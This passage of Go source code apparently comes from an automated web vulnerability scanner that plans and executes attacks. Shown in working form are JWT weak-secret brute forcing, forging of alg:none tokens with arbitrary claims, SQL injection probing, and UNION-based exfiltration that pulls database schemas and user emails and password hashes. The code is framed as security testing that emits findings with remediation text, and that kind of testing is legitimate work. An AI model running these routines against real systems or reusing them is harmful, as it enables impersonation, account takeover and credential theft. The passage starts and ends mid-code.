	if err != nil || resp == nil {
		return bolaObjectResponse{}, err
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
	resp.Body.Close()
	return bolaObjectResponse{status: resp.StatusCode, body: body}, nil
}

func confirmedObjectResponse(rule ConfirmationRule, status int, body []byte) bool {
	if status < 200 || status >= 300 {
		return false
	}
	resp := &http.Response{StatusCode: status, Header: make(http.Header)}
	return matchConfirmation(rule, resp, body)
}

func bolaAnonymousBoundaryOK(status int, ownerProofVisible bool) bool {
	if status == http.StatusUnauthorized || status == http.StatusForbidden || status == http.StatusNotFound {
		return true
	}
	if status >= 300 && status < 400 {
		return true
	}
	return !ownerProofVisible
}

func bodyContainsOwnershipMarker(body []byte, expected string) (bool, string) {
	expected = strings.TrimSpace(expected)
	if expected == "" || len(body) == 0 {
		return false, ""
	}
	var v any
	if err := json.Unmarshal(body, &v); err == nil {
		markers := ownershipMarkers(v)
		for _, marker := range markers {
			if ownershipMarkerMatches(marker, expected) {
				return true, marker
			}
		}
		if len(markers) > 0 {
			return false, strings.Join(firstN(markers, 3), ", ")
		}
	}
	lowerBody := strings.ToLower(string(body))
	lowerExpected := strings.ToLower(expected)
	if (strings.Contains(lowerBody, "owner") || strings.Contains(lowerBody, "user") ||
		strings.Contains(lowerBody, "tenant") || strings.Contains(lowerBody, "customer") ||
		strings.Contains(lowerBody, "account")) &&
		strings.Contains(lowerBody, lowerExpected) {
		return true, expected
	}
	return false, ""
}

func ownershipMarkers(v any) []string {
	var out []string
	collectOwnershipMarkers(v, nil, &out)
	return out
}

func collectOwnershipMarkers(v any, path []string, out *[]string) {
	switch x := v.(type) {
	case map[string]any:
		for k, child := range x {
			key := normalizeOwnerKey(k)
			childPath := append(path, key)
			if isOwnerContextKey(key) {
				if scalar, ok := scalarString(child); ok {
					*out = append(*out, scalar)
				} else if compact, ok := compactJSONValue(child); ok {
					*out = append(*out, compact)
				}
			}
			if pathHasOwnerContext(path) && isOwnerLeafKey(key) {
				if scalar, ok := scalarString(child); ok {
					*out = append(*out, scalar)
				}
			}
			collectOwnershipMarkers(child, childPath, out)
		}
	case []any:
		for _, child := range x {
			collectOwnershipMarkers(child, path, out)
		}
	}
}

func normalizeOwnerKey(k string) string {
	k = strings.ToLower(strings.TrimSpace(k))
	k = strings.ReplaceAll(k, "-", "")
	k = strings.ReplaceAll(k, "_", "")
	k = strings.ReplaceAll(k, " ", "")
	return k
}

func isOwnerContextKey(k string) bool {
	switch k {
	case "owner", "ownerid", "userid", "user", "uid", "customer", "customerid",
		"account", "accountid", "tenant", "tenantid", "organization", "organizationid",
		"org", "orgid", "email":
		return true
	default:
		return false
	}
}

func isOwnerLeafKey(k string) bool {
	switch k {
	case "id", "uid", "email", "username", "name", "ownerid", "userid", "customerid", "accountid", "tenantid":
		return true
	default:
		return false
	}
}

func pathHasOwnerContext(path []string) bool {
	for _, p := range path {
		if isOwnerContextKey(p) {
			return true
		}
	}
	return false
}

func scalarString(v any) (string, bool) {
	switch x := v.(type) {
	case string:
		if strings.TrimSpace(x) == "" {
			return "", false
		}
		return strings.TrimSpace(x), true
	case float64, bool:
		return strings.TrimSpace(fmt.Sprint(x)), true
	default:
		return "", false
	}
}

func compactJSONValue(v any) (string, bool) {
	b, err := json.Marshal(v)
	if err != nil || len(b) == 0 {
		return "", false
	}
	return string(b), true
}

func ownershipMarkerMatches(marker, expected string) bool {
	marker = strings.ToLower(strings.Trim(strings.TrimSpace(marker), `"'`))
	expected = strings.ToLower(strings.Trim(strings.TrimSpace(expected), `"'`))
	if marker == "" || expected == "" {
		return false
	}
	return marker == expected || strings.Contains(marker, expected)
}

func firstN(values []string, n int) []string {
	if len(values) <= n {
		return values
	}
	return values[:n]
}

// extractBearerToken pulls a JWT / bearer-looking string from a login
// response body. Covers the common JSON shapes: `"token":"..."`,
// `"authentication":{"token":"..."}`, raw `Bearer ...` strings.
func extractBearerToken(body string) string {
	if token := extractBearerTokenFromJSON(body); token != "" {
		return token
	}
	// Look for a JSON "token":"..." field.
	for _, key := range []string{`"token":"`, `"access_token":"`, `"jwt":"`} {
		if i := strings.Index(body, key); i >= 0 {
			start := i + len(key)
			if j := strings.Index(body[start:], `"`); j > 0 {
				return body[start : start+j]
			}
		}
	}
	// Fallback: look for an eyJ... JWT-shape substring (the scanner in
	// evidence.go does the same for discovery).
	if i := strings.Index(body, "eyJ"); i >= 0 {
		end := i
		for end < len(body) && !isWhitespaceOrQuote(body[end]) {
			end++
		}
		candidate := body[i:end]
		if strings.Count(candidate, ".") == 2 {
			return candidate
		}
	}
	return ""
}

func extractBearerTokenFromJSON(body string) string {
	var v any
	if err := json.Unmarshal([]byte(body), &v); err != nil {
		return ""
	}
	return firstTokenValue(v)
}

func firstTokenValue(v any) string {
	switch x := v.(type) {
	case map[string]any:
		for _, key := range []string{"token", "access_token", "jwt", "id_token"} {
			if raw, ok := x[key]; ok {
				if token, ok := raw.(string); ok && strings.TrimSpace(token) != "" {
					return strings.TrimSpace(token)
				}
			}
		}
		for _, raw := range x {
			if token := firstTokenValue(raw); token != "" {
				return token
			}
		}
	case []any:
		for _, raw := range x {
			if token := firstTokenValue(raw); token != "" {
				return token
			}
		}
	}
	return ""
}

// splitAndTrim splits s on sep and trims whitespace from each part.
// Empty parts are dropped.
func splitAndTrim(s, sep string) []string {
	parts := strings.Split(s, sep)
	out := make([]string, 0, len(parts))
	for _, p := range parts {
		p = strings.TrimSpace(p)
		if p != "" {
			out = append(out, p)
		}
	}
	return out
}

// execJWTWeakSecret brute-forces an HS256 JWT signature against a small
// industry-standard secret wordlist. Assumes a captured token is
// provided via plan.Payloads[0] (the target JWT string). If any secret
// from the wordlist verifies the signature, the secret is disclosed and
// arbitrary tokens can be forged.
//
// The plan shape:
//
//	plan.Target.URL     — auth-gated endpoint (used in the finding evidence)
//	plan.Payloads       — [originalJWT] followed by optional extra
//	                      candidate secrets (appended to the wordlist)
//	plan.Confirmation   — unused (signature verification IS the confirmation)
//
// The wordlist is deliberately small (20 entries): a reasoner-driven
// brute force is NOT a password spray, it's a targeted weakness check.
// Operators can expand this via the corpus package later.
func (e *Executor) execJWTWeakSecret(ctx context.Context, plan ProbePlan) (bool, error) {
	if len(plan.Payloads) == 0 {
		return false, nil
	}
	token := plan.Payloads[0]
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return false, nil
	}
	signingInput := parts[0] + "." + parts[1]
	sigBytes, err := base64URL.DecodeString(parts[2])
	if err != nil {
		return false, nil
	}

	// Industry-standard weak-secret wordlist. Kept tight — these are
	// the secrets people actually ship by mistake. Real-world JWT brute
	// forcers (hashcat rule files) use longer lists; this is the MVP.
	wordlist := []string{
		"secret", "Secret", "SECRET",
		"changeme", "ChangeMe", "change-me",
		"password", "Password", "1234", "12345", "123456",
		"jwt", "jwt-secret", "jwtSecret", "my-secret",
		"your-256-bit-secret",
		"aobtd", // test seed
	}
	// Allow the reasoner to append candidate secrets (from evidence).
	if len(plan.Payloads) > 1 {
		wordlist = append(wordlist, plan.Payloads[1:]...)
	}

	for _, secret := range wordlist {
		if ctx.Err() != nil {
			return false, ctx.Err()
		}
		if !hs256VerifyJWT(signingInput, sigBytes, []byte(secret)) {
			continue
		}
		// Confirmed: this secret signs the token.
		e.emitFinding(plan, secret, 200, nil,
			types.SeverityCritical, "jwt_weak_secret",
			fmt.Sprintf("JWT HS256 secret brute-forced (%q) on %s [via %s]",
				secret, plan.Target.URL, plan.SourceReasoner),
			fmt.Sprintf("The HMAC-SHA256 signing secret for tokens issued by %s is the "+
				"industry-standard weak string %q. Any attacker can forge arbitrary "+
				"JWTs for this application (admin impersonation, session injection, "+
				"tenant crossing). Plan by %s with rationale: %s",
				plan.Target.URL, secret, plan.SourceReasoner, plan.Rationale))
		return true, nil
	}
	return false, nil
}

// hs256VerifyJWT returns true when signingInput ("header.payload") signed
// with HMAC-SHA256 + secret produces the given signature bytes.
func hs256VerifyJWT(signingInput string, expectedSig, secret []byte) bool {
	m := hmac.New(sha256.New, secret)
	m.Write([]byte(signingInput))
	actualSig := m.Sum(nil)
	return hmac.Equal(actualSig, expectedSig)
}

// execChainNarrative handles ChainReasoner plans. These don't have a
// single HTTP action — they combine previously-confirmed findings into a
// multi-step attack narrative. The Executor stores the narrative as an
// info-level finding so the attack story lands in the findings table
// alongside the single-step findings the chain references.
//
// No network I/O is performed. The narrative's "confirmation" is that
// the ingredient findings are already confirmed; ChainReasoner composed
// them coherently.
func (e *Executor) execChainNarrative(ctx context.Context, plan ProbePlan) (bool, error) {
	if len(plan.Payloads) < 2 {
		return false, nil
	}
	title := fmt.Sprintf("Attack chain: %s (%d steps) [via %s]",
		plan.Target.URL, len(plan.Payloads), plan.SourceReasoner)

	// Description is the numbered step list + rationale.
	var stepList strings.Builder
	for i, step := range plan.Payloads {
		stepList.WriteString(fmt.Sprintf("  %d. %s\n", i+1, step))
	}
	description := fmt.Sprintf(
		"%s composed a multi-step attack chain combining confirmed findings.\n\n"+
			"Chain steps:\n%s\n"+
			"Rationale: %s",
		plan.SourceReasoner, stepList.String(), plan.Rationale)
	stepsToReproduce := buildChainStepsToReproduce(plan, stepList.String())

	// Store as an info-severity finding so the UI surfaces it without
	// inflating the critical/high-severity count. Downstream triage
	// ranks these by the severity of the most-severe ingredient.
	f := types.Finding{
		Title:       title,
		Description: description,
		Severity:    types.SeverityInfo,
		Confidence:  types.ConfidenceConfirmed, // "confirmed chain" — ingredients are confirmed
		EndpointID:  plan.Target.URL,
		VulnType:    "attack_chain",
		Payload:     plan.Rationale,
		Evidence: fmt.Sprintf(
			"Chain composed from confirmed findings by %s.\nSteps:\n%s",
			plan.SourceReasoner, stepList.String()),
		StepsToReproduce: stepsToReproduce,
		Remediation: "Each step in the chain has its own single-finding remediation. " +
			"Address the highest-severity ingredient first to break the chain.",
		Impact: "Chained attacks compound individual weaknesses into larger " +
			"outcomes (e.g. unauthenticated reconnaissance + weak credentials + " +
			"IDOR = complete account takeover).",
	}
	if !e.db.FindingExists(e.scanID, title, plan.Target.URL) {
		e.db.InsertFinding(e.scanID, f)
	}
	e.db.InsertNarration(e.scanID, "reasoner", "chain_confirmed",
		fmt.Sprintf("%s chain confirmed: %s", plan.SourceReasoner, title),
		plan.Target.URL, map[string]any{
			"steps":      plan.Payloads,
			"rationale":  plan.Rationale,
			"confidence": plan.Confidence,
		})
	return true, nil
}

func buildChainStepsToReproduce(plan ProbePlan, renderedSteps string) string {
	var b strings.Builder
	b.WriteString("1. Retest and confirm each ingredient finding referenced by this chain.\n")
	b.WriteString("2. Execute the chain sequence in order:\n")
	for _, line := range strings.Split(strings.TrimSpace(renderedSteps), "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		b.WriteString("   ")
		b.WriteString(line)
		b.WriteByte('\n')
	}
	b.WriteString("3. Confirm the chained outcome described by the rationale: ")
	b.WriteString(strings.TrimSpace(plan.Rationale))
	b.WriteString("\n\n")
	b.WriteString("This is a composite chain finding. The HTTP request/response proof lives in the individual confirmed ingredient findings; the chain itself performs no additional network replay.")
	return b.String()
}

// execJWTUnsigned submits a forged alg:none JWT to auth-gated endpoints
// and checks whether the server accepts it. The classic JWT "none" attack
// (CVE-style: servers that honour the alg header and skip signature check
// when it's "none").
//
// Payload shape in the plan:
//   - plan.Target.URL — the auth-gated endpoint to hit
//   - plan.Target.Method — usually "GET"
//   - plan.Target.Headers — baseline headers (e.g. Content-Type)
//   - plan.Payloads — JWT payload JSON documents to encode as claims
//     (e.g. `{"user":{"id":1,"email":"admin@target"},"role":"admin"}`)
//   - plan.Confirmation — how to tell "accepted" from "rejected"
//
// The Executor handles the base64url encoding and alg:none header
// construction so the reasoner only specifies WHAT claims to forge.
func (e *Executor) execJWTUnsigned(ctx context.Context, plan ProbePlan) (bool, error) {
	if len(plan.Payloads) == 0 {
		return false, nil
	}
	method := plan.Target.Method
	if method == "" {
		method = "GET"
	}

	// Fixed "alg:none" header — `{"alg":"none","typ":"JWT"}` base64url-encoded.
	noneHeader := "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"
	baselineStatus, baselineBody := e.jwtUnsignedAnonymousBaseline(ctx, method, plan.Target)

	for _, claims := range plan.Payloads {
		if ctx.Err() != nil {
			return false, ctx.Err()
		}
		// Validate the payload looks like a JSON object.
		trimmed := strings.TrimSpace(claims)
		if !strings.HasPrefix(trimmed, "{") || !strings.HasSuffix(trimmed, "}") {
			continue
		}
		encodedClaims := base64URLEncode([]byte(trimmed))
		// alg:none tokens carry an empty signature segment.
		forged := noneHeader + "." + encodedClaims + "."

		req, err := http.NewRequestWithContext(ctx, method, plan.Target.URL, nil)
		if err != nil {
			continue
		}
		req.Header.Set("Authorization", "Bearer "+forged)
		req.Header.Set("User-Agent", "AOBTD/"+plan.SourceReasoner)
		for k, v := range plan.Target.Headers {
			if strings.EqualFold(k, "authorization") {
				continue
			}
			req.Header.Set(k, v)
		}
		resp, err := e.client.Do(req)
		if err != nil || resp == nil {
			continue
		}
		respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
		resp.Body.Close()

		confirmation := expandJWTConfirmation(plan.Confirmation, trimmed)
		if !matchConfirmation(confirmation, resp, respBody) &&
			!jwtUnsignedBaselineBypass(baselineStatus, baselineBody, resp, respBody) {
			continue
		}
		e.emitFinding(plan, forged, resp.StatusCode, respBody,
			types.SeverityCritical, "jwt_unsigned",
			fmt.Sprintf("JWT alg:none accepted at %s [via %s]",
				plan.Target.URL, plan.SourceReasoner),
			fmt.Sprintf("A JWT with `alg: none` and forged claims %s was accepted by "+
				"%s. The server did not validate the signature, so any unauthenticated "+
				"client can impersonate arbitrary users. Plan produced by %s with rationale: %s",
				trimmed, plan.Target.URL, plan.SourceReasoner, plan.Rationale))
		return true, nil
	}
	return false, nil
}

func (e *Executor) jwtUnsignedAnonymousBaseline(ctx context.Context, method string, target ProbeTarget) (int, []byte) {
	req, err := http.NewRequestWithContext(ctx, method, target.URL, nil)
	if err != nil {
		return 0, nil
	}
	req.Header.Set("User-Agent", "AOBTD/JWTBaseline")
	for k, v := range target.Headers {
		if strings.EqualFold(k, "authorization") || strings.EqualFold(k, "cookie") {
			continue
		}
		req.Header.Set(k, v)
	}
	resp, err := e.client.Do(req)
	if err != nil || resp == nil {
		return 0, nil
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
	resp.Body.Close()
	return resp.StatusCode, body
}

func jwtUnsignedBaselineBypass(baselineStatus int, baselineBody []byte, resp *http.Response, body []byte) bool {
	if baselineStatus == 0 || resp == nil || resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return false
	}
	if baselineStatus == http.StatusUnauthorized || baselineStatus == http.StatusForbidden {
		return true
	}
	if baselineStatus >= 400 && len(body) > len(baselineBody)+20 {
		return true
	}
	baseLower := strings.ToLower(string(baselineBody))
	bodyLower := strings.ToLower(string(body))
	for _, marker := range []string{"unauthorized", "forbidden", "no authorization", "invalid token", "jwt malformed"} {
		if strings.Contains(baseLower, marker) && !strings.Contains(bodyLower, marker) {
			return true
		}
	}
	return false
}

func expandJWTConfirmation(rule ConfirmationRule, claimsJSON string) ConfirmationRule {
	identity := jwtIdentityFromClaims(claimsJSON)
	if identity == "" {
		return rule
	}
	replace := func(values []string) []string {
		if len(values) == 0 {
			return values
		}
		out := append([]string(nil), values...)
		for i, v := range out {
			v = strings.ReplaceAll(v, "{{jwt_identity}}", identity)
			v = strings.ReplaceAll(v, "{{jwt_email}}", identity)
			out[i] = v
		}
		return out
	}
	rule.BodyContains = replace(rule.BodyContains)
	rule.BodyAbsent = replace(rule.BodyAbsent)
	return rule
}

func jwtIdentityFromClaims(claimsJSON string) string {
	var root any
	if err := json.Unmarshal([]byte(claimsJSON), &root); err != nil {
		return ""
	}
	if email := firstJWTIdentity(root, true); email != "" {
		return email
	}
	return firstJWTIdentity(root, false)
}

func firstJWTIdentity(v any, requireEmail bool) string {
	switch x := v.(type) {
	case map[string]any:
		preferred := []string{"email", "mail", "preferred_username", "username", "login"}
		for _, key := range preferred {
			for k, child := range x {
				if !strings.EqualFold(k, key) {
					continue
				}
				if s, ok := child.(string); ok {
					s = strings.TrimSpace(s)
					if s != "" && (!requireEmail || strings.Contains(s, "@")) {
						return s
					}
				}
				if nested := firstJWTIdentity(child, requireEmail); nested != "" {
					return nested
				}
			}
		}
		nestedPreferred := []string{"data", "user", "account", "profile", "claims"}
		for _, key := range nestedPreferred {
			for k, child := range x {
				if !strings.EqualFold(k, key) {
					continue
				}
				if nested := firstJWTIdentity(child, requireEmail); nested != "" {
					return nested
				}
			}
		}
		for _, key := range []string{"sub", "subject"} {
			for k, child := range x {
				if !strings.EqualFold(k, key) {
					continue
				}
				if s, ok := child.(string); ok {
					s = strings.TrimSpace(s)
					if s != "" && (!requireEmail || strings.Contains(s, "@")) {
						return s
					}
				}
			}
		}
		for _, child := range x {
			if nested := firstJWTIdentity(child, requireEmail); nested != "" {
				return nested
			}
		}
	case []any:
		for _, child := range x {
			if nested := firstJWTIdentity(child, requireEmail); nested != "" {
				return nested
			}
		}
	case string:
		s := strings.TrimSpace(x)
		if s != "" && (!requireEmail || strings.Contains(s, "@")) {
			return s
		}
	}
	return ""
}

// base64URLEncode does unpadded base64url encoding (the JWT flavour).
// Using a standalone helper avoids importing encoding/base64 at the top
// of the executor; we already import net/url etc. — this keeps the blast
// radius small.
func base64URLEncode(b []byte) string {
	return base64URL.EncodeToString(b)
}

// execSQLiGeneric probes a query parameter with each payload in the plan
// and uses either (a) the plan's confirmation rule against the response, or
// (b) a baseline-diff heuristic (compare response size against a benign
// request to detect tautology-style success). Assumes GET with the target
// parameter identified by `plan.Target.Field`.
func (e *Executor) execSQLiGeneric(ctx context.Context, plan ProbePlan) (bool, error) {
	if plan.Target.Field == "" {
		// Can't do field-specific probing without a target field.
		e.logger.Info("sqli_generic: plan has no target field, skipping",
			"url", plan.Target.URL)
		return false, nil
	}

	// Baseline: request the URL with a benign value for the target field
	// and capture response size. Used if the plan's ConfirmationRule
	// doesn't have specific body_contains rules.
	baselineURL := rewriteQueryParam(plan.Target.URL, plan.Target.Field, sqliBaselineValue(plan.Target.Field))
	baselineSize := -1
	var baselineBody []byte
	if req, err := http.NewRequestWithContext(ctx, "GET", baselineURL, nil); err == nil {
		req.Header.Set("User-Agent", "AOBTD/"+plan.SourceReasoner)
		e.applyProbeHeaders(req, plan.Target.Headers)
		if resp, err := e.client.Do(req); err == nil && resp != nil {
			body, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
			resp.Body.Close()
			baselineSize = len(body)
			baselineBody = body
		}
	}

	for _, payload := range plan.Payloads {
		if ctx.Err() != nil {
			return false, ctx.Err()
		}
		u := rewriteQueryParam(plan.Target.URL, plan.Target.Field, payload)
		req, err := http.NewRequestWithContext(ctx, "GET", u, nil)
		if err != nil {
			continue
		}
		req.Header.Set("User-Agent", "AOBTD/"+plan.SourceReasoner)
		e.applyProbeHeaders(req, plan.Target.Headers)

		resp, err := e.client.Do(req)
		if err != nil || resp == nil {
			continue
		}
		respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
		resp.Body.Close()
		if graphQLSyntaxErrorResponse(plan.Target.URL, resp.StatusCode, respBody) {
			continue
		}

		hit := sqliGenericConfirmationHit(plan.Confirmation, resp, respBody, baselineSize, baselineBody)
		if !hit {
			continue
		}
		e.emitFindingWithRequestURL(plan, payload, u, http.MethodGet, resp.StatusCode, respBody,
			types.SeverityHigh, "sqli",
			fmt.Sprintf("SQL injection in %q parameter on %s [via %s]",
				plan.Target.Field, plan.Target.URL, plan.SourceReasoner),
			fmt.Sprintf("GET %s with %s=%s produced a response matching the plan's confirmation rule "+
				"(status=%d, size=%d, baseline=%d). Plan produced by %s with rationale: %s",
				plan.Target.URL, plan.Target.Field, payload, resp.StatusCode, len(respBody), baselineSize,
				plan.SourceReasoner, plan.Rationale))
		e.trySQLiUnionExfil(ctx, plan)
		return true, nil
	}
	return false, nil
}

func sqliGenericConfirmationHit(rule ConfirmationRule, resp *http.Response, body []byte, baselineSize int, baselineBody []byte) bool {
	if bodyLooksLikeSQLError(string(body)) {
		return matchConfirmationWithoutBodyContains(rule, resp, body)
	}
	if bodyContainsInjectedSQLiMarker(body) {
		return matchConfirmationWithoutBodyContains(rule, resp, body)
	}
	if sqliBooleanDifferentialHit(body, baselineBody) {
		return matchConfirmationWithoutBodyContains(rule, resp, body)
	}
	// A planner-provided body marker is useful only when the injected response
	// introduces it. Markers already present in the benign baseline (for
	// example "data" in {"data":[]}) prove nothing. Header-only rules are also
	// too weak for SQLi because ordinary JSON/HTML responses share them.
	if sqliBodyContainsIntroducedSignal(rule.BodyContains, body, baselineBody) {
		return matchConfirmation(rule, resp, body)
	}
	// Baseline-diff fallback: if the response is >3x the baseline, that's a
	// strong signal of a tautology-accepted SQLi returning substantially more
	// data than the benign value.
	return baselineSize > 0 && len(body) > 3*baselineSize && matchConfirmation(rule, resp, body)
}

func sqliBodyContainsIntroducedSignal(markers []string, body, baselineBody []byte) bool {
	if len(markers) == 0 || !sqliBodyContainsRuleLooksSpecific(markers) {
		return false
	}
	response := strings.ToLower(string(body))
	baseline := strings.ToLower(string(baselineBody))
	for _, marker := range markers {
		normalized := strings.ToLower(strings.TrimSpace(marker))
		if normalized == "" || !sqliBodyContainsRuleLooksSpecific([]string{marker}) {
			continue
		}
		if strings.Contains(response, normalized) && !strings.Contains(baseline, normalized) {
			return true
		}
	}
	return false
}

func sqliBaselineValue(field string) string {
	lower := strings.ToLower(strings.TrimSpace(field))
	switch lower {
	case "id", "carid", "itemid", "productid", "userid", "user_id", "accountid", "account_id":
		return "9999"
	default:
		return "AOBTDbaseline"
	}
}

func matchConfirmationWithoutBodyContains(rule ConfirmationRule, resp *http.Response, body []byte) bool {
	rule.BodyContains = nil
	return matchConfirmation(rule, resp, body)
}

func bodyContainsInjectedSQLiMarker(body []byte) bool {
	return strings.Contains(string(body), "AOBTD_SQLI_MARK") ||
		strings.Contains(string(body), "AOBTD_UNION_")
}

func sqliBooleanDifferentialHit(body, baselineBody []byte) bool {
	if len(body) == 0 || len(baselineBody) == 0 || bytes.Equal(body, baselineBody) {
		return false
	}
	responseFlags := extractSQLiBooleanFlags(body)
	if len(responseFlags) == 0 {
		return false
	}
	baselineFlags := extractSQLiBooleanFlags(baselineBody)
	for key, responseValue := range responseFlags {
		if !responseValue {
			continue
		}
		if baselineValue, ok := baselineFlags[key]; ok && !baselineValue {
			return true
		}
	}
	return false
}

func extractSQLiBooleanFlags(body []byte) map[string]bool {
	var raw any
	if err := json.Unmarshal(body, &raw); err != nil {
		return nil
	}
	out := make(map[string]bool)
	walkSQLiBooleanFlags(raw, "", out)
	return out
}

func walkSQLiBooleanFlags(value any, key string, out map[string]bool) {
	switch typed := value.(type) {
	case map[string]any:
		for childKey, childValue := range typed {
			walkSQLiBooleanFlags(childValue, childKey, out)
		}
	case bool:
		normalized := strings.ToLower(strings.TrimSpace(key))
		if sqlBooleanKeyLooksLikeResult(normalized) {
			out[normalized] = typed
		}
	case []any:
		for _, item := range typed {
			walkSQLiBooleanFlags(item, key, out)
		}
	}
}

func sqlBooleanKeyLooksLikeResult(key string) bool {
	if key == "" {
		return false
	}
	for _, token := range []string{"present", "found", "exists", "valid", "success", "authenticated", "allowed", "match"} {
		if strings.Contains(key, token) {
			return true
		}
	}
	return false
}

func sqliBodyContainsRuleLooksSpecific(markers []string) bool {
	for _, marker := range markers {
		m := strings.ToLower(strings.TrimSpace(marker))
		m = strings.Trim(m, `"'`)
		m = strings.Join(strings.Fields(m), " ")
		if m == "" {
			continue
		}
		switch m {
		case "ok", "success", "error", "login", "login page", "welcome",
			"html", "<html", "<!doctype html", "username", "password", "webgoat":
			continue
		}
		if strings.Contains(m, "login page") ||
			strings.Contains(m, "<html") ||
			strings.Contains(m, "doctype html") {
			continue
		}
		return true
	}
	return false
}

var (
	sqliExfilEmailRegex = regexp.MustCompile(`(?i)[a-z0-9._%+\-]+@[a-z0-9.\-]+\.[a-z]{2,}`)
	sqliExfilHashRegex  = regexp.MustCompile(`(?i)\b[0-9a-f]{32,128}\b`)
)

func (e *Executor) trySQLiUnionExfil(ctx context.Context, plan ProbePlan) {
	if e == nil || e.client == nil || plan.Target.Field == "" {
		return
	}
	method := strings.ToUpper(strings.TrimSpace(plan.Target.Method))
	if method != "" && method != "GET" {
		return
	}
	prefix, cols, ok := e.discoverSQLiUnionShape(ctx, plan)
	if !ok {
		return
	}
	if payload, status, body, ok := e.trySQLiSchemaExfil(ctx, plan, prefix, cols); ok {
		proofURL := rewriteQueryParam(plan.Target.URL, plan.Target.Field, payload)
		e.emitFindingWithRequestURL(plan, payload, proofURL, http.MethodGet, status, body,
			types.SeverityHigh, "sqli_schema_exposure",
			fmt.Sprintf("SQL injection exposes database schema via %s [via %s]",
				plan.Target.URL, plan.SourceReasoner),
			fmt.Sprintf("After confirming SQL injection, AOBTD discovered a UNION shape with %d columns and used it to read database schema metadata. This proves the issue can move from boolean/search manipulation into structured data exfiltration.", cols))
	}
	if payload, status, body, ok := e.trySQLiCredentialExfil(ctx, plan, prefix, cols); ok {
		proofURL := rewriteQueryParam(plan.Target.URL, plan.Target.Field, payload)
		e.emitFindingWithRequestURL(plan, payload, proofURL, http.MethodGet, status, body,
			types.SeverityCritical, "sqli_credential_exfiltration",
			fmt.Sprintf("SQL injection exfiltrates credential-like user data via %s [via %s]",
				plan.Target.URL, plan.SourceReasoner),
			fmt.Sprintf("After confirming SQL injection, AOBTD discovered a UNION shape with %d columns and used common account-table projections to recover email/hash-like credential material. This demonstrates direct data exfiltration impact, not just a tautology response.", cols))
	}
}

func (e *Executor) discoverSQLiUnionShape(ctx context.Context, plan ProbePlan) (string, int, bool) {
	for _, prefix := range []string{
		"')) UNION SELECT %s-- ",
		"') UNION SELECT %s-- ",
		"' UNION SELECT %s-- ",
		"\") UNION SELECT %s-- ",
		"\" UNION SELECT %s-- ",
	} {
		for cols := 1; cols <= 12; cols++ {
			payload := fmt.Sprintf(prefix, unionMarkerSelectList(cols))
			status, body, err := e.sendSQLiGET(ctx, plan, payload)
			if err != nil || status < 200 || status >= 300 || bodyLooksLikeSQLError(body) {
				continue
			}
			if strings.Contains(body, "AOBTD_UNION_") || cols == 1 {
				return prefix, cols, true
			}
		}
	}
	return "", 0, false
}

func (e *Executor) trySQLiSchemaExfil(ctx context.Context, plan ProbePlan, prefix string, cols int) (string, int, []byte, bool) {
	candidates := []string{
		fmt.Sprintf(prefix, fitUnionSelectList(cols, []string{"sql"})+" FROM sqlite_master"),
		fmt.Sprintf(prefix, fitUnionSelectList(cols, []string{"table_name", "column_name"})+" FROM information_schema.columns"),
		fmt.Sprintf(prefix, fitUnionSelectList(cols, []string{"table_name"})+" FROM information_schema.tables"),
	}
	for _, payload := range candidates {
		status, body, err := e.sendSQLiGET(ctx, plan, payload)
		if err != nil || status < 200 || status >= 300 || bodyLooksLikeSQLError(body) {
			continue
		}
		lower := strings.ToLower(body)
		if strings.Contains(lower, "create table") ||
			(strings.Contains(lower, "table_name") && strings.Contains(lower, "column_name")) {
			return payload, status, []byte(body), true
		}
	}
	return "", 0, nil, false
}

func (e *Executor) trySQLiCredentialExfil(ctx context.Context, plan ProbePlan, prefix string, cols int) (string, int, []byte, bool) {
	tables := []string{"users", "Users", "user", "accounts", "Accounts", "members", "customers", "Customers"}
	projections := [][]string{
		{"id", "email", "password", "role"},
		{"id", "username", "email", "password", "role"},
		{"id", "email", "password_hash", "role"},
		{"id", "email", "passwordHash", "role"},
		{"id", "email", "passwd", "role"},
		{"id", "email", "hash", "role"},
		{"email", "password"},
		{"username", "password"},
	}
	for _, table := range tables {
		for _, projection := range projections {
			payload := fmt.Sprintf(prefix, fitUnionSelectList(cols, projection)+" FROM "+table)
			status, body, err := e.sendSQLiGET(ctx, plan, payload)
			if err != nil || status < 200 || status >= 300 || bodyLooksLikeSQLError(body) {
				continue
			}
			if looksLikeCredentialExfil(body) {
				return payload, status, []byte(body), true
			}
		}
	}
	return "", 0, nil, false
}

func (e *Executor) sendSQLiGET(ctx context.Context, plan ProbePlan, payload string) (int, string, error) {
	u := rewriteQueryParam(plan.Target.URL, plan.Target.Field, payload)
	req, err := http.NewRequestWithContext(ctx, "GET", u, nil)
	if err != nil {
		return 0, "", err
	}
	req.Header.Set("User-Agent", "AOBTD/"+plan.SourceReasoner+" (sqli-union)")
	e.applyProbeHeaders(req, plan.Target.Headers)
	resp, err := e.client.Do(req)
	if err != nil || resp == nil {
		return 0, "", err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 512*1024))
	return resp.StatusCode, string(body), nil
}

func unionMarkerSelectList(cols int) string {
	if cols <= 0 {
		return "NULL"
	}
	exprs := make([]string, 0, cols)
	for i := 1; i <= cols; i++ {
		if i == 1 {
			exprs = append(exprs, "NULL")
			continue
		}
		exprs = append(exprs, fmt.Sprintf("'AOBTD_UNION_%d'", i))
	}
	return strings.Join(exprs, ",")
}

func fitUnionSelectList(cols int, projection []string) string {
	if cols <= 0 {
		return "NULL"
	}
	exprs := make([]string, 0, cols)
	for i := 0; i < cols; i++ {
		if i < len(projection) {
			exprs = append(exprs, projection[i])
		} else {
			exprs = append(exprs, "NULL")
		}
	}
	return strings.Join(exprs, ",")
}

func bodyLooksLikeSQLError(body string) bool {
	lower := strings.ToLower(body)
	for _, marker := range []string{
		"sql error", "sqlite_error", "sql syntax", "mysql error", "mysqli_sql_exception",
		"you have an error in your sql syntax", "warning: mysql", "postgresql error",
		"jdbcsqlsyntaxerrorexception", "bad sql grammar", "data conversion error converting",
		"unterminated", "unknown column", "no such column", "no such table",
